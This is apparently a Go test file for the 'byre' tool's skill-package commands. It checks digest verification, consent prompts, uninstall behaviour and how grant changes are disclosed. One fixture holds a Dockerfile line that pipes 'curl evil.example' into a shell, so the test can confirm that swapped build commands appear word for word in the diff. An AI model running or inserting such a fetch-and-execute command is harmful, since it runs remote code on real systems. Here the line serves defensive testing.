package commands

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/pjlsergeant/byre/internal/config"
	"github.com/pjlsergeant/byre/internal/packages"
	"github.com/pjlsergeant/byre/internal/skills"
)

// publishSkill writes a distributable skill (manifest + payloads) into a
// directory and returns the manifest path and its package digest.
func publishSkill(t *testing.T, id, version, extra string) (manifestPath, digest string) {
	t.Helper()
	dir := t.TempDir()
	payload := []byte("#!/bin/sh\necho " + version + "\n")
	manifest := []byte(`[package]
id = "` + id + `"
version = "` + version + `"
kind = "skill"
package_api = 1
requires_byre = ">=0.1.0"
description = "published test skill"

[context]
text = "hello"
` + extra + `
[[package.files]]
src = "hooks/run.sh"
dest = "hooks/run.sh"
sha256 = "` + packages.HashBytes(payload) + `"
executable = true
`)
	if err := os.MkdirAll(filepath.Join(dir, "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "hooks", "run.sh"), payload, 0o755); err != nil {
		t.Fatal(err)
	}
	manifestPath = filepath.Join(dir, "skill.toml")
	if err := os.WriteFile(manifestPath, manifest, 0o644); err != nil {
		t.Fatal(err)
	}
	files, err := packages.ParseManifestFiles(manifest)
	if err != nil {
		t.Fatal(err)
	}
	return manifestPath, packages.PackageDigest(manifest, packages.RecordsFromEntries(files))
}

func installHome(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	t.Setenv("BYRE_HOME", home)
	return home
}

func TestInstallFreshNonTTY(t *testing.T) {
	home := installHome(t)
	uri, digest := publishSkill(t, "pete/tool", "1.0.0", "")
	s, _, errBuf := testStreams("", false)
	// Fresh ID, no references: proceeds in a pipe.
	if err := SkillInstall(s, uri, "sha256:"+digest, false); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(errBuf.String(), "grants nothing until enabled") {
		t.Fatalf("missing boundary statement:\n%s", errBuf.String())
	}
	// Snapshot exists; resolves as installed through a fresh catalog.
	cat, err := packages.LoadCatalog(home, nil, "v0.2.0", "0.2.0", packages.Stage2Hooks{Skill: skills.ValidatePrimaryBytes, Template: config.ValidateTemplateBytes})
	if err != nil {
		t.Fatal(err)
	}
	ent, err := cat.ResolveName("pete/tool")
	if err != nil {
		t.Fatal(err)
	}
	if ent.Provenance != packages.ProvInstalled || ent.Digest != digest {
		t.Fatalf("ent = %+v", ent)
	}
}

func TestInstallDigestMismatchRefuses(t *testing.T) {
	installHome(t)
	uri, _ := publishSkill(t, "pete/tool", "1.0.0", "")
	s := discardStreams()
	err := SkillInstall(s, uri, "sha256:"+strings.Repeat("00", 32), false)
	if err == nil || !strings.Contains(err.Error(), "digest mismatch") {
		t.Fatalf("want digest-mismatch refusal, got %v", err)
	}
}

func TestInstallSameDigestNoOp(t *testing.T) {
	installHome(t)
	uri, _ := publishSkill(t, "pete/tool", "1.0.0", "")
	s := discardStreams()
	if err := SkillInstall(s, uri, "", false); err != nil {
		t.Fatal(err)
	}
	s2, _, errBuf := testStreams("", false)
	if err := SkillInstall(s2, uri, "", false); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(errBuf.String(), "nothing to do") {
		t.Fatalf("want no-op notice:\n%s", errBuf.String())
	}
}

func TestReplacementRefusesInPipeWithoutYes(t *testing.T) {
	installHome(t)
	v1, _ := publishSkill(t, "pete/tool", "1.0.0", "")
	if err := SkillInstall(discardStreams(), v1, "", false); err != nil {
		t.Fatal(err)
	}
	v2, _ := publishSkill(t, "pete/tool", "2.0.0", "")
	err := SkillInstall(discardStreams(), v2, "", false)
	if err == nil || !strings.Contains(err.Error(), "--yes") {
		t.Fatalf("replacement in a pipe must demand --yes, got %v", err)
	}
	// With --yes it proceeds and shows the grant delta path.
	s, _, errBuf := testStreams("", false)
	if err := SkillInstall(s, v2, "", true); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(errBuf.String(), "replacing pete/tool") {
		t.Fatalf("want replacement banner:\n%s", errBuf.String())
	}
}

func TestReplacementCallsOutNewGrants(t *testing.T) {
	installHome(t)
	v1, _ := publishSkill(t, "pete/tool", "1.0.0", "")
	if err := SkillInstall(discardStreams(), v1, "", false); err != nil {
		t.Fatal(err)
	}
	v2, _ := publishSkill(t, "pete/tool", "2.0.0", `
[runtime]
caps = ["NET_ADMIN"]
`)
	s, _, errBuf := testStreams("", false)
	if err := SkillInstall(s, v2, "", true); err != nil {
		t.Fatal(err)
	}
	out := errBuf.String()
	if !strings.Contains(out, "New or widened grant declarations") || !strings.Contains(out, "cap: NET_ADMIN") {
		t.Fatalf("new cap must be called out:\n%s", out)
	}
	if !strings.Contains(out, "payload changed: hooks/run.sh") {
		t.Fatalf("payload diff missing:\n%s", out)
	}
	// The closer must not claim "grants nothing" after a replacement.
	if strings.Contains(out, "grants nothing") {
		t.Fatalf("replacement closer must not walk back the consent narrative:\n%s", out)
	}
}

// A replacement that swaps a raw Dockerfile command behind an UNCHANGED line
// count must still surface in the grant diff, verbatim.
func TestReplacementSurfacesDockerfileSwap(t *testing.T) {
	installHome(t)
	v1, _ := publishSkill(t, "pete/tool", "1.0.0", `
[build]
dockerfile = ["RUN echo benign"]
`)
	if err := SkillInstall(discardStreams(), v1, "", false); err != nil {
		t.Fatal(err)
	}
	v2, _ := publishSkill(t, "pete/tool", "2.0.0", `
[build]
dockerfile = ["RUN curl evil.example | sh"]
`)
	s, _, errBuf := testStreams("", false)
	if err := SkillInstall(s, v2, "", true); err != nil {
		t.Fatal(err)
	}
	out := errBuf.String()
	if !strings.Contains(out, "+ dockerfile (not introspected): RUN curl evil.example | sh") {
		t.Fatalf("swapped dockerfile line must appear verbatim in the diff:\n%s", out)
	}
	if !strings.Contains(out, "- dockerfile (not introspected): RUN echo benign") {
		t.Fatalf("dropped dockerfile line must appear under removals:\n%s", out)
	}
}

func TestInstallAsActivationGuard(t *testing.T) {
	home := installHome(t)
	// A stored config references the id BEFORE it is installed
	// (install-as-activation).
	pdir := filepath.Join(home, "projects", "someproj")
	if err := os.MkdirAll(pdir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(pdir, "byre.config"),
		[]byte("skills = [\"pete/tool\"]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	uri, _ := publishSkill(t, "pete/tool", "1.0.0", "")
	// Pipe without --yes: refuse.
	err := SkillInstall(discardStreams(), uri, "", false)
	if err == nil || !strings.Contains(err.Error(), "--yes") {
		t.Fatalf("activating install in a pipe must demand --yes, got %v", err)
	}
	// TTY: enumerates the box, asks, accepts y.
	s, _, errBuf := testStreams("y\n", true)
	if err := SkillInstall(s, uri, "", false); err != nil {
		t.Fatal(err)
	}
	out := errBuf.String()
	if !strings.Contains(out, "ACTIVATES") || !strings.Contains(out, "someproj") {
		t.Fatalf("activation prompt must name the box:\n%s", out)
	}
}

func TestInstallRefusesLocalIDCollision(t *testing.T) {
	home := installHome(t)
	dir := filepath.Join(home, "skills", "pete", "tool")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "skill.toml"), []byte("description = \"local\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	uri, _ := publishSkill(t, "pete/tool", "1.0.0", "")
	err := SkillInstall(discardStreams(), uri, "", false)
	if err == nil || !strings.Contains(err.Error(), "already exists") {
		t.Fatalf("want local-collision refusal, got %v", err)
	}
}

func TestInstallKindVerbMismatch(t *testing.T) {
	installHome(t)
	uri, _ := publishSkill(t, "pete/tool", "1.0.0", "")
	err := TemplateInstall(discardStreams(), uri, "", false)
	if err == nil || !strings.Contains(err.Error(), "byre skill install") {
		t.Fatalf("want kind/verb refusal, got %v", err)
	}
}

func TestUninstallScansAndRemoves(t *testing.T) {
	home := installHome(t)
	uri, digest := publishSkill(t, "pete/tool", "1.0.0", "")
	if err := SkillInstall(discardStreams(), uri, "", false); err != nil {
		t.Fatal(err)
	}
	// Reference it from a project.
	pdir := filepath.Join(home, "projects", "someproj")
	mustMkdirAll(t, pdir, 0o755)
	mustWriteFile(t, filepath.Join(pdir, "byre.config"), []byte("agent = \"none\"\nskills = [\"pete/tool\"]\n"), 0o644)

	// Pipe without --yes refuses (always).
	if err := SkillUninstall(discardStreams(), "pete/tool", false); err == nil {
		t.Fatal("uninstall in a pipe must demand --yes")
	}
	s, _, errBuf := testStreams("", false)
	if err := SkillUninstall(s, "pete/tool", true); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(errBuf.String(), "someproj") {
		t.Fatalf("uninstall must name referencing boxes:\n%s", errBuf.String())
	}
	if _, err := os.Stat(packages.SnapshotDir(home, digest)); !os.IsNotExist(err) {
		t.Fatal("snapshot must be gone")
	}
	// Kind-correct remedies for the wrong provenance.
	if err := SkillUninstall(discardStreams(), "claude", true); err == nil ||
		!strings.Contains(err.Error(), "bundled") {
		t.Fatalf("bundled uninstall must explain itself, got %v", err)
	}
}

// publishTemplate mirrors publishSkill for a payload-less template package.
func publishTemplate(t *testing.T, id, version string) (manifestPath, digest string) {
	t.Helper()
	dir := t.TempDir()
	manifest := []byte(`base = "debian:stable"

[package]
id = "` + id + `"
version = "` + version + `"
kind = "template"
package_api = 1
requires_byre = ">=0.1.0"
description = "published test template"
`)
	manifestPath = filepath.Join(dir, "template.config")
	if err := os.WriteFile(manifestPath, manifest, 0o644); err != nil {
		t.Fatal(err)
	}
	files, err := packages.ParseManifestFiles(manifest)
	if err != nil {
		t.Fatal(err)
	}
	return manifestPath, packages.PackageDigest(manifest, packages.RecordsFromEntries(files))
}

// One id, one kind: a template must not replace an installed skill under the
// same id, even with --yes -- stored references mean the old kind.
func TestInstallRefusesCrossKindReplacement(t *testing.T) {
	installHome(t)
	skillURI, _ := publishSkill(t, "pete/tool", "1.0.0", "")
	if err := SkillInstall(discardStreams(), skillURI, "", false); err != nil {
		t.Fatal(err)
	}
	tmplURI, _ := publishTemplate(t, "pete/tool", "2.0.0")
	err := TemplateInstall(discardStreams(), tmplURI, "", true)
	if err == nil || !strings.Contains(err.Error(), "refusing to change its kind") {
		t.Fatalf("cross-kind replacement must refuse, got %v", err)
	}
}

// The reinstall remedy the catalog prints for a broken snapshot (same URI,
// pinned digest) must actually repair it: the same-digest no-op yields to a
// consented re-land, and the present-but-corrupt dir is rewritten.
func TestInstallRepairsBrokenSnapshot(t *testing.T) {
	home := installHome(t)
	uri, digest := publishSkill(t, "pete/tool", "1.0.0", "")
	if err := SkillInstall(discardStreams(), uri, "", false); err != nil {
		t.Fatal(err)
	}
	prim := filepath.Join(packages.SnapshotDir(home, digest), "skill.toml")
	if err := os.Remove(prim); err != nil {
		t.Fatal(err)
	}
	// Repair flips referencing boxes from failing back to running: it is a
	// state change, so a pipe without --yes refuses.
	if err := SkillInstall(discardStreams(), uri, "sha256:"+digest, false); err == nil ||
		!strings.Contains(err.Error(), "--yes") {
		t.Fatalf("repair in a pipe must demand --yes, got %v", err)
	}
	s, _, errBuf := testStreams("", false)
	if err := SkillInstall(s, uri, "sha256:"+digest, true); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(errBuf.String(), "reinstalling the same verified bytes") {
		t.Fatalf("repair must say what it is doing:\n%s", errBuf.String())
	}
	if _, err := os.Stat(prim); err != nil {
		t.Fatalf("snapshot primary not restored: %v", err)
	}
	cat, err := packages.LoadCatalog(home, nil, "v0.2.0", "0.2.0", packages.Stage2Hooks{Skill: skills.ValidatePrimaryBytes, Template: config.ValidateTemplateBytes})
	if err != nil {
		t.Fatal(err)
	}
	ent, err := cat.ResolveName("pete/tool")
	if err != nil {
		t.Fatal(err)
	}
	if ent.Provenance != packages.ProvInstalled {
		t.Fatalf("repaired package must resolve as installed, got %+v", ent)
	}
}

// A replacement over a broken snapshot cannot diff grants against bytes that
// are gone; it must show the candidate's declarations in full instead of
// silently implying nothing changed.
func TestReplacementOverBrokenSnapshotShowsFullGrants(t *testing.T) {
	home := installHome(t)
	v1, d1 := publishSkill(t, "pete/tool", "1.0.0", "")
	if err := SkillInstall(discardStreams(), v1, "", false); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(filepath.Join(packages.SnapshotDir(home, d1), "skill.toml")); err != nil {
		t.Fatal(err)
	}
	v2, _ := publishSkill(t, "pete/tool", "2.0.0", `
[runtime]
caps = ["NET_ADMIN"]
`)
	s, _, errBuf := testStreams("", false)
	if err := SkillInstall(s, v2, "", true); err != nil {
		t.Fatal(err)
	}
	out := errBuf.String()
	if !strings.Contains(out, "candidate grant declarations (in full") || !strings.Contains(out, "cap: NET_ADMIN") {
		t.Fatalf("grants must be shown in full when the installed side is unreadable:\n%s", out)
	}
}

// A broken snapshot's other remedy is removal: the INVALID catalog row must
// not make the indexed package un-uninstallable.
func TestUninstallRemovesBrokenInstall(t *testing.T) {
	home := installHome(t)
	uri, digest := publishSkill(t, "pete/tool", "1.0.0", "")
	if err := SkillInstall(discardStreams(), uri, "", false); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(filepath.Join(packages.SnapshotDir(home, digest), "skill.toml")); err != nil {
		t.Fatal(err)
	}
	if err := SkillUninstall(discardStreams(), "pete/tool", true); err != nil {
		t.Fatalf("broken install must stay uninstallable, got %v", err)
	}
	idx, err := packages.ReadIndex(home)
	if err != nil {
		t.Fatal(err)
	}
	if len(idx) != 0 {
		t.Fatalf("index must be empty after uninstall, got %+v", idx)
	}
}

// Uninstalling the installed side of a contested id is activation, not
// cleanup: the local claimant becomes the sole provider and referencing
// boxes run IT -- the consent must say so, not promise a resolve error.
func TestUninstallContestedIdDisclosesTakeover(t *testing.T) {
	home := installHome(t)
	uri, _ := publishSkill(t, "pete/tool", "1.0.0", "")
	if err := SkillInstall(discardStreams(), uri, "", false); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(home, "skills", "pete", "tool")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "skill.toml"), []byte("description = \"local\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	pdir := filepath.Join(home, "projects", "someproj")
	mustMkdirAll(t, pdir, 0o755)
	mustWriteFile(t, filepath.Join(pdir, "byre.config"), []byte("agent = \"none\"\nskills = [\"pete/tool\"]\n"), 0o644)

	s, _, errBuf := testStreams("", false)
	if err := SkillUninstall(s, "pete/tool", true); err != nil {
		t.Fatal(err)
	}
	out := errBuf.String()
	if !strings.Contains(out, "contested") || !strings.Contains(out, "surviving claimant") {
		t.Fatalf("contested uninstall must disclose the takeover:\n%s", out)
	}
	if strings.Contains(out, "resolve error") || strings.Contains(out, "reinstall remedy") {
		t.Fatalf("contested uninstall must not promise a resolve error:\n%s", out)
	}
	if !strings.Contains(out, "someproj") {
		t.Fatalf("referencing box must be named:\n%s", out)
	}
	// And the takeover is real: the local package now provides the id.
	cat, err := packages.LoadCatalog(home, nil, "v0.2.0", "0.2.0", packages.Stage2Hooks{Skill: skills.ValidatePrimaryBytes, Template: config.ValidateTemplateBytes})
	if err != nil {
		t.Fatal(err)
	}
	ent, err := cat.ResolveName("pete/tool")
	if err != nil {
		t.Fatal(err)
	}
	if ent.Provenance != packages.ProvLocal {
		t.Fatalf("survivor should be the local package, got %+v", ent)
	}
}

// With THREE claimants (installed + local skill + local template), removing
// the installed copy must not promise activation: the locals still conflict
// and referencing boxes keep failing. The disclosure must name every claimant.
func TestUninstallMultiClaimantStaysContested(t *testing.T) {
	home := installHome(t)
	uri, _ := publishSkill(t, "pete/tool", "1.0.0", "")
	if err := SkillInstall(discardStreams(), uri, "", false); err != nil {
		t.Fatal(err)
	}
	sdir := filepath.Join(home, "skills", "pete", "tool")
	mustMkdirAll(t, sdir, 0o755)
	mustWriteFile(t, filepath.Join(sdir, "skill.toml"), []byte("description = \"local\"\n"), 0o644)
	tdir := filepath.Join(home, "templates", "pete", "tool")
	mustMkdirAll(t, tdir, 0o755)
	mustWriteFile(t, filepath.Join(tdir, "template.config"), []byte("base = \"debian:stable\"\n"), 0o644)

	s, _, errBuf := testStreams("", false)
	if err := SkillUninstall(s, "pete/tool", true); err != nil {
		t.Fatal(err)
	}
	out := errBuf.String()
	if !strings.Contains(out, "contested among the remaining claimants") {
		t.Fatalf("multi-claimant uninstall must not promise activation:\n%s", out)
	}
	if strings.Contains(out, "SOLE provider") || strings.Contains(out, "surviving claimant now provides") {
		t.Fatalf("must not promise a survivor while two claimants remain:\n%s", out)
	}
	if !strings.Contains(out, sdir) || !strings.Contains(out, tdir) {
		t.Fatalf("disclosure must name every claimant:\n%s", out)
	}
	cat, err := packages.LoadCatalog(home, nil, "v0.2.0", "0.2.0", packages.Stage2Hooks{Skill: skills.ValidatePrimaryBytes, Template: config.ValidateTemplateBytes})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := cat.ResolveName("pete/tool"); err == nil {
		t.Fatal("id must stay conflicted after removing one of three claimants")
	}
}

func TestInspectURIDoesNotInstall(t *testing.T) {
	home := installHome(t)
	uri, digest := publishSkill(t, "pete/tool", "1.0.0", "")
	s, out, _ := testStreams("", false)
	if err := SkillInspect(s, uri); err != nil {
		t.Fatal(err)
	}
	text := out.String()
	if !strings.Contains(text, "sha256:"+digest) || !strings.Contains(text, "Not installed") {
		t.Fatalf("inspect output:\n%s", text)
	}
	if !strings.Contains(text, "payload: hooks/run.sh") {
		t.Fatalf("payload list missing:\n%s", text)
	}
	if _, err := os.Stat(packages.SnapshotDir(home, digest)); !os.IsNotExist(err) {
		t.Fatal("inspect must not install")
	}
	idx, err := packages.ReadIndex(home)
	if err != nil {
		t.Fatal(err)
	}
	if len(idx) != 0 {
		t.Fatalf("index must stay empty, got %+v", idx)
	}
}
